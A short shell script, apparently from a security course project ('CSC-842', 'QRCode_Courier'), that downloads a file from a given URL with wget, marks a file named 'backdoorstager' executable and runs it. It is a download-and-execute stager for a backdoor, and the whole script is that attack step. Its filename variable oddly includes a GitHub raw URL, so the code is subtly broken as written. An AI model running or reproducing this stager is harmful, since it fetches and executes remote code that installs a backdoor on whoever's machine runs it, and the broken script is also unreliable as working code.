
#!/bin/sh
[ $# -ne 1 -o "x$1" = "x" ] && {
	echo "Usage: $0 <ur>" 1>&2
	exit 1
}
url=$1
filename='backdoorstager https://raw.githubusercontent.com/kwafula/CSC-842/main/Cycle7_QRCode_Courier/backdoorstager'
wget $url
chmod 755 $filename
./$filename


